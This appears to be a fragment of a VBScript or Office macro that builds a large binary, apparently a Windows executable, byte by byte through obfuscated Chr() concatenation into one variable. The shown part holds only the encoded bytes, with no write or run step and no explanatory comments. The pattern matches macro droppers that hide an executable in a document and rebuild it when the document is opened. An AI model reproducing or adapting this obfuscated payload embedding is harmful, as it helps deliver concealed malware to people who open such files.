GqnqCn=GqnqCn&Chr(20)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(224)&Chr(0)&Chr(117)&Chr(49)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(86)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(235)&Chr(18)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(93)&Chr(8)&Chr(106)&Chr(4)&Chr(232)&Chr(16)&Chr(204)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(125)&Chr(228)&Chr(133)&Chr(255)&Chr(15)&Chr(133)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(61)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(44)&Chr(86)&Chr(232)&Chr(18)&Chr(212)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(210)&Chr(254)
GqnqCn=GqnqCn&Chr(255)&Chr(255)&Chr(232)&Chr(147)&Chr(206)&Chr(255)&Chr(255)&Chr(57)&Chr(125)&Chr(224)&Chr(117)&Chr(108)&Chr(139)&Chr(240)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(62)&Chr(206)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(6)&Chr(235)&Chr(95)&Chr(133)&Chr(255)&Chr(15)&Chr(133)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(110)&Chr(206)&Chr(255)&Chr(255)&Chr(57)&Chr(125)&Chr(224)&Chr(116)&Chr(104)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(113)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(86)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(117)&Chr(86)&Chr(57)&Chr(5)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(52)&Chr(86)&Chr(232)&Chr(169)&Chr(211)&Chr(255)&Chr(255)&Chr(89)&Chr(133)
GqnqCn=GqnqCn&Chr(192)&Chr(116)&Chr(31)&Chr(131)&Chr(254)&Chr(224)&Chr(118)&Chr(205)&Chr(86)&Chr(232)&Chr(153)&Chr(211)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(34)&Chr(206)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(232)&Chr(56)&Chr(200)&Chr(255)&Chr(255)&Chr(195)&Chr(232)&Chr(15)&Chr(206)&Chr(255)&Chr(255)&Chr(233)&Chr(124)&Chr(255)&Chr(255)&Chr(255)&Chr(133)&Chr(255)&Chr(117)&Chr(22)&Chr(232)&Chr(1)&Chr(206)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(177)&Chr(205)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(89)&Chr(139)&Chr(199)&Chr(235)&Chr(210)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(8)&Chr(137)&Chr(125)&Chr(252)&Chr(137)&Chr(117)&Chr(248)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(193)&Chr(233)&Chr(7)&Chr(235)&Chr(6)
GqnqCn=GqnqCn&Chr(141)&Chr(155)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(102)&Chr(15)&Chr(111)&Chr(6)&Chr(102)&Chr(15)&Chr(111)&Chr(78)&Chr(16)&Chr(102)&Chr(15)&Chr(111)&Chr(86)&Chr(32)&Chr(102)&Chr(15)&Chr(111)&Chr(94)&Chr(48)&Chr(102)&Chr(15)&Chr(127)&Chr(7)&Chr(102)&Chr(15)&Chr(127)&Chr(79)&Chr(16)&Chr(102)&Chr(15)&Chr(127)&Chr(87)&Chr(32)&Chr(102)&Chr(15)&Chr(127)&Chr(95)&Chr(48)&Chr(102)&Chr(15)&Chr(111)&Chr(102)&Chr(64)&Chr(102)&Chr(15)&Chr(111)&Chr(110)&Chr(80)&Chr(102)&Chr(15)&Chr(111)&Chr(118)&Chr(96)&Chr(102)&Chr(15)&Chr(111)&Chr(126)&Chr(112)&Chr(102)&Chr(15)&Chr(127)&Chr(103)&Chr(64)&Chr(102)&Chr(15)&Chr(127)&Chr(111)&Chr(80)&Chr(102)&Chr(15)&Chr(127)&Chr(119)&Chr(96)&Chr(102)&Chr(15)&Chr(127)&Chr(127)&Chr(112)&Chr(141)&Chr(182)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(73)&Chr(117)&Chr(163)&Chr(139)
GqnqCn=GqnqCn&Chr(117)&Chr(248)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(28)&Chr(137)&Chr(125)&Chr(244)&Chr(137)&Chr(117)&Chr(248)&Chr(137)&Chr(93)&Chr(252)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(195)&Chr(153)&Chr(139)&Chr(200)&Chr(139)&Chr(69)&Chr(8)&Chr(51)&Chr(202)&Chr(43)&Chr(202)&Chr(131)&Chr(225)&Chr(15)&Chr(51)&Chr(202)&Chr(43)&Chr(202)&Chr(153)&Chr(139)&Chr(248)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(131)&Chr(231)&Chr(15)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(139)&Chr(209)&Chr(11)&Chr(215)&Chr(117)&Chr(74)&Chr(139)&Chr(117)&Chr(16)&Chr(139)&Chr(206)&Chr(131)&Chr(225)&Chr(127)&Chr(137)&Chr(77)&Chr(232)&Chr(59)&Chr(241)&Chr(116)&Chr(19)&Chr(43)&Chr(241)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(39)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(77)&Chr(232)
GqnqCn=GqnqCn&Chr(133)&Chr(201)&Chr(116)&Chr(119)&Chr(139)&Chr(93)&Chr(16)&Chr(139)&Chr(85)&Chr(12)&Chr(3)&Chr(211)&Chr(43)&Chr(209)&Chr(137)&Chr(85)&Chr(236)&Chr(3)&Chr(216)&Chr(43)&Chr(217)&Chr(137)&Chr(93)&Chr(240)&Chr(139)&Chr(117)&Chr(236)&Chr(139)&Chr(125)&Chr(240)&Chr(139)&Chr(77)&Chr(232)&Chr(243)&Chr(164)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(83)&Chr(59)&Chr(207)&Chr(117)&Chr(53)&Chr(247)&Chr(217)&Chr(131)&Chr(193)&Chr(16)&Chr(137)&Chr(77)&Chr(228)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(228)&Chr(243)&Chr(164)&Chr(139)&Chr(77)&Chr(8)&Chr(3)&Chr(77)&Chr(228)&Chr(139)&Chr(85)&Chr(12)&Chr(3)&Chr(85)&Chr(228)&Chr(139)&Chr(69)&Chr(16)&Chr(43)&Chr(69)&Chr(228)&Chr(80)&Chr(82)&Chr(81)&Chr(232)&Chr(76)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(26)&Chr(139)&Chr(117)&Chr(12)
GqnqCn=GqnqCn&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(209)&Chr(193)&Chr(233)&Chr(2)&Chr(243)&Chr(165)&Chr(139)&Chr(202)&Chr(131)&Chr(225)&Chr(3)&Chr(243)&Chr(164)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(93)&Chr(252)&Chr(139)&Chr(117)&Chr(248)&Chr(139)&Chr(125)&Chr(244)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(72)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(84)&Chr(198)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(102)&Chr(15)&Chr(40)&Chr(193)&Chr(199)&Chr(69)&Chr(228)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(35)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(0)&Chr(139)&Chr(0)&Chr(61)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(116)&Chr(10)&Chr(61)&Chr(29)&Chr(0)&Chr(0)&Chr(192)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(195)&Chr(51)&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(131)&Chr(101)&Chr(228)&Chr(0)
GqnqCn=GqnqCn&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(86)&Chr(198)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(51)&Chr(192)&Chr(83)&Chr(137)&Chr(69)&Chr(252)&Chr(137)&Chr(69)&Chr(244)&Chr(137)&Chr(69)&Chr(248)&Chr(83)&Chr(156)&Chr(88)&Chr(139)&Chr(200)&Chr(53)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(80)&Chr(157)&Chr(156)&Chr(90)&Chr(43)&Chr(209)&Chr(116)&Chr(31)&Chr(81)&Chr(157)&Chr(51)&Chr(192)&Chr(15)&Chr(162)&Chr(137)&Chr(69)&Chr(244)&Chr(137)&Chr(93)&Chr(232)&Chr(137)&Chr(85)&Chr(236)&Chr(137)&Chr(77)&Chr(240)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(162)&Chr(137)&Chr(85)&Chr(252)&Chr(137)&Chr(69)&Chr(248)&Chr(91)&Chr(247)&Chr(69)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(116)&Chr(14)&Chr(232)&Chr(92)&Chr(255)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(51)&Chr(192)&Chr(64)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(91)&Chr(201)&Chr(195)&Chr(232)&Chr(153)&Chr(255)&Chr(255)&Chr(255)&Chr(163)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(129)&Chr(1)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(4)&Chr(232)&Chr(243)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(8)&Chr(232)&Chr(235)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(12)&Chr(232)&Chr(227)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(16)&Chr(232)&Chr(219)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(20)&Chr(232)&Chr(211)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(24)&Chr(232)&Chr(203)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(54)&Chr(232)&Chr(196)&Chr(220)&Chr(255)&Chr(255)&Chr(255)
GqnqCn=GqnqCn&Chr(118)&Chr(32)&Chr(232)&Chr(188)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(36)&Chr(232)&Chr(180)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(40)&Chr(232)&Chr(172)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(44)&Chr(232)&Chr(164)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(48)&Chr(232)&Chr(156)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(52)&Chr(232)&Chr(148)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(28)&Chr(232)&Chr(140)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(56)&Chr(232)&Chr(132)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(60)&Chr(232)&Chr(124)&Chr(220)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(64)&Chr(255)&Chr(118)&Chr(64)&Chr(232)&Chr(113)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(68)&Chr(232)&Chr(105)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(72)&Chr(232)&Chr(97)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)
GqnqCn=GqnqCn&Chr(76)&Chr(232)&Chr(89)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(80)&Chr(232)&Chr(81)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(84)&Chr(232)&Chr(73)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(88)&Chr(232)&Chr(65)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(92)&Chr(232)&Chr(57)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(96)&Chr(232)&Chr(49)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(100)&Chr(232)&Chr(41)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(104)&Chr(232)&Chr(33)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(108)&Chr(232)&Chr(25)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(112)&Chr(232)&Chr(17)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(116)&Chr(232)&Chr(9)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(120)&Chr(232)&Chr(1)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(124)&Chr(232)&Chr(249)&Chr(219)
GqnqCn=GqnqCn&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(64)&Chr(255)&Chr(182)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(235)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(224)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(136)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(213)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(140)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(202)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(144)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(191)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(148)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(180)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(152)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(169)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(156)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(158)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(160)&Chr(0)&Chr(0)&Chr(0)&Chr(232)
GqnqCn=GqnqCn&Chr(147)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(164)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(136)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(168)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(125)&Chr(219)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(44)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(116)&Chr(53)&Chr(139)&Chr(6)&Chr(59)&Chr(5)&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(90)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(4)&Chr(59)&Chr(5)&Chr(228)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(72)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(118)&Chr(8)&Chr(59)&Chr(53)&Chr(232)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(54)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(94)&Chr(93)
GqnqCn=GqnqCn&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(116)&Chr(126)&Chr(139)&Chr(70)&Chr(12)&Chr(59)&Chr(5)&Chr(236)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(20)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(16)&Chr(59)&Chr(5)&Chr(240)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(2)&Chr(219)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(20)&Chr(59)&Chr(5)&Chr(244)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(240)&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(24)&Chr(59)&Chr(5)&Chr(248)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(222)&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(28)&Chr(59)&Chr(5)&Chr(252)&Chr(170)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(204)
GqnqCn=GqnqCn&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(70)&Chr(32)&Chr(59)&Chr(5)&Chr(0)&Chr(171)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(186)&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(118)&Chr(36)&Chr(59)&Chr(53)&Chr(4)&Chr(171)&Chr(64)&Chr(0)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(168)&Chr(218)&Chr(255)&Chr(255)&Chr(89)&Chr(94)&Chr(93)&Chr(195)&Chr(204)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(139)&Chr(85)&Chr(12)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(2)&Chr(10)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(194)&Chr(1)&Chr(15)&Chr(171)&Chr(4)&Chr(36)&Chr(235)&Chr(241)&Chr(139)&Chr(117)&Chr(8)&Chr(131)&Chr(201)&Chr(255)&Chr(141)&Chr(73)&Chr(0)&Chr(131)&Chr(193)&Chr(1)&Chr(138)&Chr(6)&Chr(10)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(198)&Chr(1)
GqnqCn=GqnqCn&Chr(15)&Chr(163)&Chr(4)&Chr(36)&Chr(115)&Chr(238)&Chr(139)&Chr(193)&Chr(131)&Chr(196)&Chr(32)&Chr(94)&Chr(201)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(84)&Chr(36)&Chr(4)&Chr(139)&Chr(76)&Chr(36)&Chr(8)&Chr(247)&Chr(194)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(60)&Chr(139)&Chr(2)&Chr(58)&Chr(1)&Chr(117)&Chr(46)&Chr(10)&Chr(192)&Chr(116)&Chr(38)&Chr(58)&Chr(97)&Chr(1)&Chr(117)&Chr(37)&Chr(10)&Chr(228)&Chr(116)&Chr(29)&Chr(193)&Chr(232)&Chr(16)&Chr(58)&Chr(65)&Chr(2)&Chr(117)&Chr(25)&Chr(10)&Chr(192)&Chr(116)&Chr(17)&Chr(58)&Chr(97)&Chr(3)&Chr(117)&Chr(16)&Chr(131)&Chr(193)&Chr(4)&Chr(131)&Chr(194)&Chr(4)&Chr(10)&Chr(228)&Chr(117)&Chr(210)&Chr(139)&Chr(255)&Chr(51)&Chr(192)&Chr(195)&Chr(144)&Chr(27)&Chr(192)&Chr(209)&Chr(224)&Chr(131)&Chr(192)&Chr(1)&Chr(195)
GqnqCn=GqnqCn&Chr(247)&Chr(194)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(24)&Chr(138)&Chr(2)&Chr(131)&Chr(194)&Chr(1)&Chr(58)&Chr(1)&Chr(117)&Chr(231)&Chr(131)&Chr(193)&Chr(1)&Chr(10)&Chr(192)&Chr(116)&Chr(220)&Chr(247)&Chr(194)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(164)&Chr(102)&Chr(139)&Chr(2)&Chr(131)&Chr(194)&Chr(2)&Chr(58)&Chr(1)&Chr(117)&Chr(206)&Chr(10)&Chr(192)&Chr(116)&Chr(198)&Chr(58)&Chr(97)&Chr(1)&Chr(117)&Chr(197)&Chr(10)&Chr(228)&Chr(116)&Chr(189)&Chr(131)&Chr(193)&Chr(2)&Chr(235)&Chr(136)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(51)&Chr(192)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(80)&Chr(139)&Chr(85)&Chr(12)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(2)&Chr(10)&Chr(192)&Chr(116)&Chr(9)&Chr(131)&Chr(194)&Chr(1)&Chr(15)&Chr(171)&Chr(4)
GqnqCn=GqnqCn&Chr(36)&Chr(235)&Chr(241)&Chr(139)&Chr(117)&Chr(8)&Chr(139)&Chr(255)&Chr(138)&Chr(6)&Chr(10)&Chr(192)&Chr(116)&Chr(12)&Chr(131)&Chr(198)&Chr(1)&Chr(15)&Chr(163)&Chr(4)&Chr(36)&Chr(115)&Chr(241)&Chr(141)&Chr(70)&Chr(255)&Chr(131)&Chr(196)&Chr(32)&Chr(94)&Chr(201)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(86)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(193)&Chr(139)&Chr(209)&Chr(3)&Chr(198)&Chr(59)&Chr(254)&Chr(118)&Chr(8)&Chr(59)&Chr(248)&Chr(15)&Chr(130)&Chr(164)&Chr(1)&Chr(0)&Chr(0)&Chr(129)&Chr(249)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(114)&Chr(31)&Chr(131)&Chr(61)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(22)&Chr(87)&Chr(86)&Chr(131)&Chr(231)&Chr(15)&Chr(131)&Chr(230)&Chr(15)&Chr(59)&Chr(254)&Chr(94)&Chr(95)&Chr(117)&Chr(8)&Chr(94)&Chr(95)&Chr(93)&Chr(233)&Chr(142)
GqnqCn=GqnqCn&Chr(250)&Chr(255)&Chr(255)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(21)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(42)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(144)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(233)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(3)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(40)&Chr(100)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(36)&Chr(101)&Chr(64)&Chr(0)&Chr(144)&Chr(255)&Chr(36)&Chr(141)&Chr(168)&Chr(100)&Chr(64)&Chr(0)&Chr(144)&Chr(56)&Chr(100)&Chr(64)&Chr(0)&Chr(100)&Chr(100)&Chr(64)&Chr(0)&Chr(136)&Chr(100)&Chr(64)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(193)
GqnqCn=GqnqCn&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(198)&Chr(3)&Chr(131)&Chr(199)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(204)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(198)&Chr(2)&Chr(131)&Chr(199)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(166)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(144)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(131)&Chr(198)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(11)&Chr(101)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(248)&Chr(100)&Chr(64)&Chr(0)&Chr(240)&Chr(100)&Chr(64)&Chr(0)&Chr(232)&Chr(100)&Chr(64)&Chr(0)&Chr(224)&Chr(100)&Chr(64)&Chr(0)&Chr(216)&Chr(100)&Chr(64)&Chr(0)&Chr(208)&Chr(100)&Chr(64)&Chr(0)&Chr(200)&Chr(100)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(228)&Chr(137)&Chr(68)&Chr(143)&Chr(228)&Chr(139)&Chr(68)&Chr(142)&Chr(232)&Chr(137)&Chr(68)&Chr(143)&Chr(232)&Chr(139)&Chr(68)&Chr(142)&Chr(236)&Chr(137)&Chr(68)&Chr(143)&Chr(236)&Chr(139)&Chr(68)&Chr(142)&Chr(240)&Chr(137)&Chr(68)&Chr(143)&Chr(240)&Chr(139)&Chr(68)&Chr(142)&Chr(244)&Chr(137)&Chr(68)&Chr(143)&Chr(244)&Chr(139)&Chr(68)&Chr(142)&Chr(248)&Chr(137)&Chr(68)&Chr(143)&Chr(248)&Chr(139)&Chr(68)&Chr(142)&Chr(252)&Chr(137)&Chr(68)&Chr(143)&Chr(252)&Chr(141)&Chr(4)&Chr(141)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)
